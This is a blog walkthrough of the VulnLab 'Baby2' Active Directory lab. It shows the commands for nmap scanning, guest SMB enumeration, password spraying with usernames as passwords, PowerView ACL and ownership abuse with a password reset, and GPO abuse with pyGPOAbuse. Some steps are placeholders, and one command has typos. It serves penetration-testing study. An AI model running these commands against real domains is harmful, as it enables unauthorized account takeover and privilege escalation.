---
layout: post
title: VulnLab - Baby2 Walkthrough
date: 16-04-2025
categories: [Machines]
tags: [misconfigurations, ACLs, GPOs, smb, guest]
image: "https://assets.vulnlab.com/baby2_slide.png"
---

## Introduction

Welcome back to my Active Directory exploitation series from VulnLab! In the previous post, we explored “Baby”, a beginner-friendly Windows machine that introduced key AD fundamentals like LDAP enumeration and abusing SeBackupPrivilege for privilege escalation.

Today, we’re stepping things up with the second lab in the series — “Baby2”.

Baby2 is a solo, intermediate-level Windows Active Directory machine that dives deeper into AD misconfigurations, with a strong focus on Access Control Lists (ACLs) and Group Policy Objects (GPOs). These are common real-world components of Active Directory environments, and understanding how to identify and abuse misconfigurations around them is crucial for any Pentration Tester or Red Teamer.

> By the end of this lab, you’ll have hands-on experience with:
>- Identifying misconfigured ACLs on domain objects
>- Leveraging GPO-based privilege escalation 
{: .prompt-tip }

### Understanding the Concepts
Before jumping into the exploitation phase, let’s break down the two main concepts this lab focuses on — `Access Control Lists (ACLs)` and `Group Policy Objects (GPOs)` in a beginner-friendly way.

**Access Control Lists (ACLs)**
> An `Access Control List (ACL)` in Active Directory is essentially a set of permissions attached to an object, think of it as a list of `who can do what`. For example, imagine a shared folder in an office: 
>- Alice might have permission to read files, Bob can edit them, and Charlie has full control, including read, write, and delete access. 
>- Similarly, in Active Directory, ACLs define who can access, modify, or take control of objects like user accounts, groups, or computers. 
{: .prompt-tip }

## Scanning
```bash
nmap -Pn -T4 -sC -sV  -p53,88,135,139,389,445,464,593,636,3389,5985,9389,49664,49667,49669,49674,49676,63798,63782,63775  10.10.83.184 -oN reports/all_tcp.txt
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 01:33 EAT
Nmap scan report for 10.10.83.184 (10.10.83.184)
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-13 22:34:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-04-13T21:30:57
|_Not valid after:  2026-04-13T21:30:57
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-13T22:34:55+00:00
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2025-04-12T21:39:46
|_Not valid after:  2025-10-12T21:39:46
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
63775/tcp open  msrpc         Microsoft Windows RPC
63782/tcp open  msrpc         Microsoft Windows RPC
63798/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-13T22:34:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.82 seconds

```

## Enumeration

### SMB

```bash
nxc smb 10.10.83.184 -u 'Guest' -p '' --shares
```

![alt text](/assets/screenshots/baby2/1.png)

Got users

![alt text](/assets/screenshots/baby2/2.png)

Username as Password

```bash
nxc smb 10.10.68.173 -u loots/users.txt -p loots/users.txt --continue-on-success --no-bruteforce
```

![alt text](/assets/screenshots/baby2/3.png)

Enumerating Users

```bash
nxc smb 10.10.68.173 -u Carl.Moore -p Carl.Moore --users
```

![alt text](/assets/screenshots/baby2/4.png)

### Bloodhound

```bash
bloodhound-python -d baby2.vl  -c all -u 'Carl.Moore' -p 'Carl.Moore' -ns 10.10.68.173 --zip
```

![alt text](/assets/screenshots/baby2/5.png)

![alt text](/assets/screenshots/baby2/6.png)

## Initial Access

### Abusing Logon Script

here

![alt text](/assets/screenshots/baby2/7.png)

here

![alt text](/assets/screenshots/baby2/8.png)

dd

Got a shell

![alt text](/assets/screenshots/baby2/9.png)

## Privilege Escalation

### writeDACL

![alt text](/assets/screenshots/baby2/10.png)

```powershell
Import-Module .\PowerView.ps1
```

```powershell
Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths
```

Confirm

```powershell
Get-ADUser gpoadmin | ForEach-Object {Get-ACL "AD:\$($_.DistingishedNam)" | Select-Object -ExpandProperty Owner}
```

All ACL

```powershell
Add-DomainObjectAcl -PrincipalIdentity Amelia.Griffiths -TargetIdentity gpoadm -Rights All
```

Change Password

```powershell
$NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
```

```powershell
Set-DomainUserPassword -Identity 'gpoadm' -AccountPassword $NewPassword
```

Finally

```powershell
nxc smb 10.10.70.158 -u gpoadm -p 'Password1234'
```

![alt text](/assets/screenshots/baby2/11.png)

### GPO Abuse

![alt text](/assets/screenshots/baby2/12.png)

GPO Path

![alt text](/assets/screenshots/baby2/13.png)

Abuse GPO

```powershell
python3 pygpoabuse.py 'baby2.vl/gpoadm:Password1234' -gpo-id "6AC1786C-016F-11D2-945F-00C04FB984F9" -command "net localgroup administrators gpoadm /add" -f
```

```powershell
gpupdate /force
```

![alt text](/assets/screenshots/baby2/14.png)

Dump Secrets

![alt text](/assets/screenshots/baby2/15.png)

Root

![alt text](/assets/screenshots/baby2/16.png)

## References

[NetExec Cheatsheet](https://seriotonctf.github.io/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/)

[Logon script | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/logon-script)

[Abusing AD-DACL: WriteDacl - Hacking Articles](https://www.hackingarticles.in/abusing-ad-dacl-writedacl/)

https://github.com/Hackndo/pyGPOAbuse